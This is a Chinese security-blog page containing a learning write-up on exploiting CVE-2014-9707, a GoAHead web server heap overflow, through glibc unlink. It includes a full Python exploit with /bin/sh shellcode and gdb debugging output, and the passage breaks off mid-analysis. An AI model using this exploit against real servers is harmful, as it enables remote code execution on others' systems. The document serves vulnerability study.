<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】从CVE-2014-9707看unlink漏洞利用 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="CVE-2014-9707,unlink,unlink漏洞,漏洞利用"/>
    
        <meta name="description" content="最近一直在看泉哥的 《漏洞战争：软件漏洞分析精要》 ，我接触二进制的时间并不长，但是觉得这本书特别好，最主要的原因是这本书中的漏洞涵盖了绝大多数常见的漏洞类型，而且，每个漏洞都能够还原出一个基本的漏洞模型。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】从CVE-2014-9707看unlink漏洞利用</h2>
                <div class="article-msg">
                    <span class="time">2016-09-20 16:26:01</span>
                    
                                        <span class="read">阅读：21913次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3043"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3043" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=1353169030" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01acaeca3752f24139.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=1353169030" style="color:#848e99;">k0shl</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p1.qhimg.com/t01d7413d3d52ff6113.jpg" title="t010e08ae42deb86ebe.jpg" alt="http://p6.qhimg.com/t010e08ae42deb86ebe.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">作者：k0shl</span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">稿费：700RMB（不服你也来投稿啊！）</span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">最近一直在看泉哥的 《漏洞战争：软件漏洞分析精要》，我接触二进制的时间并不长，但是觉得这本书特别好，最主要的原因是这本书中的漏洞涵盖了绝大多数常见的漏洞类型，而且，每个漏洞都能够还原出一个基本的漏洞模型。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">说起漏洞模型，我在前不久碰到一个非常有趣的漏洞，也就是我写这篇文章的主角CVE-2014-9707，一个Linux下服务端软件GoAHead的堆溢出漏洞，在分析完这个漏洞后我发现，这个漏洞可以还原出一个非常有趣而且常见的基本漏洞模型，对于我这样的新人学习Linux下堆溢出漏洞利用有很大的帮助，因此我总结了整个过程与大家分享，最后要感谢fneig、explorer师傅的指导！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">首先我贴出这个漏洞的PoC</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
#!/usr/bin/env&nbsp;python
#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-
from&nbsp;pwn&nbsp;import&nbsp;*
def&nbsp;hex2url(i):
&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;=&nbsp;format(i,&nbsp;&#39;X&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(array)&nbsp;%&nbsp;2&nbsp;!=&nbsp;0:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array&nbsp;=&nbsp;&#39;0&#39;&nbsp;+&nbsp;array
&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;&#39;&#39;.join(&#39;%&#39;&nbsp;+&nbsp;array[i-2:i]&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(len(array),&nbsp;0,&nbsp;-2))
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ret
def&nbsp;fake(chunk_addr):
&nbsp;&nbsp;&nbsp;&nbsp;print(hex(chunk_addr))
&nbsp;&nbsp;&nbsp;&nbsp;chunk&nbsp;=&nbsp;int(hex(chunk_addr)[0:8],&nbsp;16)&nbsp;+&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;print(chunk)
&nbsp;&nbsp;&nbsp;&nbsp;fake_fd&nbsp;=&nbsp;hex(chunk)
&nbsp;&nbsp;&nbsp;&nbsp;fake_chunk_addr&nbsp;=&nbsp;int(fake_fd&nbsp;+&nbsp;&#39;2f&#39;,&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;fake_bk&nbsp;=&nbsp;fake_chunk_addr&nbsp;-&nbsp;8
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;fake_chunk_addr,&nbsp;int(fake_fd,&nbsp;16),&nbsp;fake_bk
def&nbsp;make_fake_chunk(chunk_addr):
&nbsp;&nbsp;&nbsp;&nbsp;chunk&nbsp;=&nbsp;(chunk_addr&nbsp;&amp;&nbsp;~0xff)&nbsp;+&nbsp;0x12f
&nbsp;&nbsp;&nbsp;&nbsp;fd&nbsp;=&nbsp;int(format(chunk,&nbsp;&#39;08X&#39;)[:6],&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;bk&nbsp;=&nbsp;chunk
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;fd,&nbsp;bk,&nbsp;chunk
pro&nbsp;=&nbsp;remote(&#39;localhost&#39;,&nbsp;80)
chunk&nbsp;=&nbsp;0x8057840
fd,&nbsp;bk,&nbsp;fake_chunk&nbsp;=&nbsp;make_fake_chunk(chunk)
print(hex(fd),&nbsp;hex(bk),&nbsp;hex(fake_chunk))
shellcode&nbsp;=&nbsp;&#39;%eb%16%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90&#39;
shellcode&nbsp;+=&nbsp;&quot;%eb%19%5e%31%d2%89%56%07%52%56%89%e1%89%f3%31%c0%b0%0b%cd&quot;
shellcode&nbsp;+=&nbsp;&quot;%80%31%db%31%c0%40%cd%80%e8%e2%ff%ff%ff%2f%62%69&quot;
shellcode&nbsp;+=&nbsp;&quot;%6e%2f%73%68&quot;
shellcode_addr&nbsp;=&nbsp;fake_chunk&nbsp;+&nbsp;4&nbsp;*&nbsp;4
offset&nbsp;=&nbsp;0
exp&nbsp;=&nbsp;&#39;GET&nbsp;/&#39;
exp&nbsp;+=&nbsp;hex2url(fd)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;fd
exp&nbsp;+=&nbsp;hex2url(bk)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;bk
exp&nbsp;+=&nbsp;hex2url(0xbffff2ac&nbsp;-&nbsp;20)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;fd_next,&nbsp;stack
exp&nbsp;+=&nbsp;hex2url(shellcode_addr)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;bk_next
pad&nbsp;=&nbsp;fake_chunk&nbsp;-&nbsp;chunk&nbsp;-&nbsp;16
print(&#39;pad:{0}&#39;.format(pad))
#&nbsp;fake&nbsp;chunk
exp&nbsp;+=&nbsp;&#39;A&#39;&nbsp;*&nbsp;(fake_chunk&nbsp;-&nbsp;chunk&nbsp;-&nbsp;16)
exp&nbsp;+=&nbsp;hex2url(0x01020304)&nbsp;&nbsp;&nbsp;#&nbsp;prev_size
exp&nbsp;+=&nbsp;hex2url(0x01020304)&nbsp;&nbsp;&nbsp;#&nbsp;size
exp&nbsp;+=&nbsp;hex2url(chunk&nbsp;-&nbsp;8)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;fd
exp&nbsp;+=&nbsp;hex2url(chunk&nbsp;-&nbsp;8)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;bk
exp&nbsp;+=&nbsp;shellcode
print(&#39;--{}&#39;.format(1024&nbsp;-&nbsp;(fake_chunk&nbsp;-&nbsp;chunk)&nbsp;-&nbsp;16&nbsp;-&nbsp;len(shellcode)/3))
exp&nbsp;+=&nbsp;&#39;/./&#39;
exp&nbsp;+=&nbsp;hex2url(2)&nbsp;*&nbsp;50
exp&nbsp;+=&nbsp;&#39;A&#39;&nbsp;*&nbsp;(1024&nbsp;-&nbsp;(fake_chunk&nbsp;-&nbsp;chunk)&nbsp;-&nbsp;16&nbsp;-&nbsp;len(shellcode)&nbsp;/&nbsp;3&nbsp;-&nbsp;50)
exp&nbsp;+=&nbsp;&#39;/.ssss&#39;
#exp&nbsp;+=&nbsp;&#39;A&#39;*1024
exp&nbsp;+=&nbsp;&#39;&nbsp;HTTP/1.0\r\n\r\n&#39;
print(len(exp))
print(exp)
pro.send(exp)
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这是一个非常有意思的堆溢出漏洞，Goahead是一个知名的Web Server服务器，在处理传入数据包时，对数据包分别进行了一些处理，在处理之后与之前的长度，没有进行有效的对称，从而导致将后续数据包考入之前申请的缓冲区时，如果后续数据包长度过大，会使之前的缓冲区发生溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">之前缓冲区是malloc申请而成，溢出后，可以通过覆盖某些关键指针和变量，来在堆释放时触发unlink，从而导致任意代码执行，下面对此漏洞进行详细分析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先运行Goahead，然后通过gdb attach pid附加进程，运行exp，发现程序中断，命中断点。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;c
Continuing.
Program&nbsp;received&nbsp;signal&nbsp;SIGABRT,&nbsp;Aborted.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x0&nbsp;
EBX:&nbsp;0x545&nbsp;
ECX:&nbsp;0x545&nbsp;
EDX:&nbsp;0x6&nbsp;
ESI:&nbsp;0x45&nbsp;(&#39;E&#39;)
EDI:&nbsp;0xb7eec000&nbsp;--&gt;&nbsp;0x1a5da8&nbsp;
EBP:&nbsp;0xbffff178&nbsp;--&gt;&nbsp;0x805cb28&nbsp;--&gt;&nbsp;0x0&nbsp;
ESP:&nbsp;0xbfffeeb4&nbsp;--&gt;&nbsp;0xbffff178&nbsp;--&gt;&nbsp;0x805cb28&nbsp;--&gt;&nbsp;0x0&nbsp;
EIP:&nbsp;0xb7fdebe0&nbsp;(&lt;__kernel_vsyscall+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ebp)
EFLAGS:&nbsp;0x202&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fdebdc&nbsp;&lt;__kernel_vsyscall+12&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fdebdd&nbsp;&lt;__kernel_vsyscall+13&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fdebde&nbsp;&lt;__kernel_vsyscall+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;0x80
=&gt;&nbsp;0xb7fdebe0&nbsp;&lt;__kernel_vsyscall+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ebp
&nbsp;&nbsp;&nbsp;0xb7fdebe1&nbsp;&lt;__kernel_vsyscall+17&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;edx
&nbsp;&nbsp;&nbsp;0xb7fdebe2&nbsp;&lt;__kernel_vsyscall+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ecx
&nbsp;&nbsp;&nbsp;0xb7fdebe3&nbsp;&lt;__kernel_vsyscall+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;0xb7fdebe4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int3
[------------------------------------stack-------------------------------------]
0000|&nbsp;0xbfffeeb4&nbsp;--&gt;&nbsp;0xbffff178&nbsp;--&gt;&nbsp;0x805cb28&nbsp;--&gt;&nbsp;0x0&nbsp;
0004|&nbsp;0xbfffeeb8&nbsp;--&gt;&nbsp;0x6&nbsp;
0008|&nbsp;0xbfffeebc&nbsp;--&gt;&nbsp;0x545&nbsp;
0012|&nbsp;0xbfffeec0&nbsp;--&gt;&nbsp;0xb7d74307&nbsp;(&lt;__GI_raise+71&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xchg&nbsp;&nbsp;&nbsp;ebx,edi)
0016|&nbsp;0xbfffeec4&nbsp;--&gt;&nbsp;0xb7eec000&nbsp;--&gt;&nbsp;0x1a5da8&nbsp;
0020|&nbsp;0xbfffeec8&nbsp;--&gt;&nbsp;0xbfffef64&nbsp;--&gt;&nbsp;0x77&nbsp;(&#39;w&#39;)
0024|&nbsp;0xbfffeecc&nbsp;--&gt;&nbsp;0xb7d759c3&nbsp;(&lt;__GI_abort+323&gt;:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;edx,DWORD&nbsp;PTR&nbsp;gs:0x8)
0028|&nbsp;0xbfffeed0&nbsp;--&gt;&nbsp;0x6&nbsp;
[------------------------------------------------------------------------------]
Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
Stopped&nbsp;reason:&nbsp;SIGABRT
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过bt命令可以回溯调用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;bt
#0&nbsp;&nbsp;0xb7fdebe0&nbsp;in&nbsp;__kernel_vsyscall&nbsp;()
#1&nbsp;&nbsp;0xb7d74307&nbsp;in&nbsp;__GI_raise&nbsp;(sig=sig@entry=0x6)
&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;../nptl/sysdeps/unix/sysv/linux/raise.c:56
#2&nbsp;&nbsp;0xb7d759c3&nbsp;in&nbsp;__GI_abort&nbsp;()&nbsp;at&nbsp;abort.c:89
#3&nbsp;&nbsp;0xb7db26f8&nbsp;in&nbsp;__libc_message&nbsp;(do_abort=do_abort@entry=0x1,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;fmt=fmt@entry=0xb7ea865c&nbsp;&quot;***&nbsp;Error&nbsp;in&nbsp;`%s&#39;:&nbsp;%s:&nbsp;0x%s&nbsp;***\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;../sysdeps/posix/libc_fatal.c:175
#4&nbsp;&nbsp;0xb7db876a&nbsp;in&nbsp;malloc_printerr&nbsp;(action=&lt;optimized&nbsp;out&gt;,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;str=0xb7ea4138&nbsp;&quot;corrupted&nbsp;double-linked&nbsp;list&quot;,&nbsp;ptr=0x805cb28)
&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;malloc.c:4996
#5&nbsp;&nbsp;0xb7db95fb&nbsp;in&nbsp;_int_free&nbsp;(av=0xb7eec420&nbsp;&lt;main_arena&gt;,&nbsp;p=&lt;optimized&nbsp;out&gt;,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;have_lock=0x0)&nbsp;at&nbsp;malloc.c:3996
#6&nbsp;&nbsp;0xb7dbc0c3&nbsp;in&nbsp;__GI___libc_free&nbsp;(mem=&lt;optimized&nbsp;out&gt;)&nbsp;at&nbsp;malloc.c:2946
#7&nbsp;&nbsp;0xb7fb661d&nbsp;in&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3238
#8&nbsp;&nbsp;0xb7fb8ab3&nbsp;in&nbsp;parseFirstLine&nbsp;(wp=&lt;optimized&nbsp;out&gt;)&nbsp;at&nbsp;src/http.c:957
#9&nbsp;&nbsp;parseIncoming&nbsp;(wp=&lt;optimized&nbsp;out&gt;)&nbsp;at&nbsp;src/http.c:872
#10&nbsp;websPump&nbsp;(wp=0x804f560)&nbsp;at&nbsp;src/http.c:826
#11&nbsp;0xb7fb906d&nbsp;in&nbsp;readEvent&nbsp;(wp=0x804f560)&nbsp;at&nbsp;src/http.c:799
#12&nbsp;socketEvent&nbsp;(sid=0x2,&nbsp;mask=0x2,&nbsp;wptr=0x804f560)&nbsp;at&nbsp;src/http.c:737
#13&nbsp;0xb7fc6322&nbsp;in&nbsp;socketDoEvent&nbsp;(sp=0x804f4b0)&nbsp;at&nbsp;src/socket.c:650
#14&nbsp;socketProcess&nbsp;()&nbsp;at&nbsp;src/socket.c:624
#15&nbsp;0xb7fb35b5&nbsp;in&nbsp;websServiceEvents&nbsp;(finished=0x804ab44&nbsp;&lt;finished&gt;)
&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;src/http.c:1293
#16&nbsp;0x08048c31&nbsp;in&nbsp;main&nbsp;(argc=0x5,&nbsp;argv=0xbffff4b4,&nbsp;envp=0xbffff4cc)
&nbsp;&nbsp;&nbsp;&nbsp;at&nbsp;src/goahead.c:146
#17&nbsp;0xb7d5fa63&nbsp;in&nbsp;__libc_start_main&nbsp;(main=0x8048a70&nbsp;&lt;main&gt;,&nbsp;argc=0x5,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;argv=0xbffff4b4,&nbsp;init=0x80491e0&nbsp;&lt;__libc_csu_init&gt;,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;fini=0x8049250&nbsp;&lt;__libc_csu_fini&gt;,&nbsp;rtld_fini=0xb7fedc90&nbsp;&lt;_dl_fini&gt;,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;stack_end=0xbffff4ac)&nbsp;at&nbsp;libc-start.c:287
#18&nbsp;0x08048f67&nbsp;in&nbsp;_start&nbsp;()
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">查看一下现在服务器上的情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
/./mean&nbsp;to&nbsp;strcat&nbsp;cannot&nbsp;heap&nbsp;overflow
